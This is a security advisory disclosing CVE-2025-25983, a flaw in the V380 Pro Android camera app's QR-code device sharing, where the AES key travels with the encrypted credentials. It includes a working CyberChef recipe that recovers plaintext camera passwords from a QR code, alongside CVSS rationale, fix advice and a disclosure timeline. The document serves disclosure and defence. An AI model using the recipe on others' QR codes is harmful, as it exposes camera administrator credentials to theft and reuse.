# QR-based device sharing credentials leak

- CVE ID: CVE-2025-25983
- CVSS3.1 vector: AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:N/A:N
- CVSS3.1 score: 3.4 (Low)
- CWE-257: Storing Passwords in a Recoverable Format
- CWE-656: Reliance on Security Through Obscurity

### Summary:

QR code based device sharing component present in Macro-video Technologies Co.,Ltd V380 Pro android application versions 2.1.44 and 2.1.64 allows an attacker to obtain plaintext credentials from the created QR code.

### Details:

The QR-code based sharing encrypts credentials using AES, but shares the encryption key alongside the encrypted data.
As a result, an attacker with QR code access can recover plaintext credentials for further attacks.
The application does not inform the users about the possibility of the credentials being recovered.

### Proof of Concept:

Credentials could be restored by using a [Python3 script](/CVE-2025-25983_PoC.py) or through online tools such as CyberChef:

```
https://gchq.github.io/CyberChef/#recipe=Parse_QR_Code(false)Regular_expression('User%20defined','.*%5C%5C%5E(.*)',true,true,false,false,false,false,'List%20capture%20groups')From_Base64('A-Za-z0-9%2B/%3D',true,true)JPath_expression('akey,msg,did',':')Register('%22(.*)%22:%22(.*)%22:(.*)',false,false,false)Regular_expression('User%20defined','%22.*%22:%22(.*)%22',true,true,false,false,false,false,'List%20capture%20groups')AES_Decrypt(%7B'option':'Base64','string':'$R0'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'ECB','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)Find_/_Replace(%7B'option':'Regex','string':'%5E(.*)$'%7D,'$R0%23$1',true,false,true,false)Fork('%23',':',false)From_Base64('A-Za-z0-9%2B/%3D',true,false)Merge(true)Find_/_Replace(%7B'option':'Regex','string':'%5E(.*)$'%7D,'$R2:$1',true,false,true,false)
```

### Impact:

An attacker can gain access to plaintext credentials, which could be used for credential stuffing attacks.

### Affected products:

- V380 Pro android application - 2.1.44
- V380 Pro android application - 2.1.64
- Possibly, other versions of V380 Pro android application

### Recommendation for vendor:

There are multiple ways to fix or address the vulnerability:

- Create new accounts with random credentials while sharing the device (the cameras seem to support that)
- Use token-based sharing to avoid credentials leak
- Warn about credentials sharing to make customers aware of the potential impact.

### Recommendation for customers:

Use unique randomly generated credentials for each camera to protect against credential stuffing attacks.

### Rationale for CVSS assessment:

- Attack Vector: Network
> Attack does not require interaction with the camera or the app.
> The credentials are recovered from the QR code that can be shared over the network.
- Attack Complexity: Low
> Attacker can obtain credentials from the QR code without any external requirements beyond attacker's control.
- Privileges Required: High
> The QR code gives administrative access to the IP camera and the attacker must obtain that QR code to exploit the vulnerability.
- User Interaction: Required
> QR code is used for device sharing, so the attacker must obtain the QR code from another user.
- Scope: Changed
> The vulnerability allows the attacker to obtain plaintext credentials for further credential stuffing attacks on other systems.
- Confidentiality Impact: Low
> Credentials by themselves are confidential, but they do not pose immediate significant impact.
- Integrity Impact: None
> Credentials leak by a highly privileged attacker does not affect integrity.
- Availability Impact: None
> Credentials leak by a highly privileged attacker does not affect availability.

### Timeline:

- 17.12.2024 - Vulnerability discovered
- 19.01.2025 - Vulnerability reported to vendor, no meaningful reply
- 26.01.2025 - CVE ID requested
- 13.02.2025 - Received CVE ID: CVE-2025-25983
- 22.02.2025 - Second attempt to contact vendor, providing CVE ID and disclosure date
- 13.04.2025 - Responsible disclosure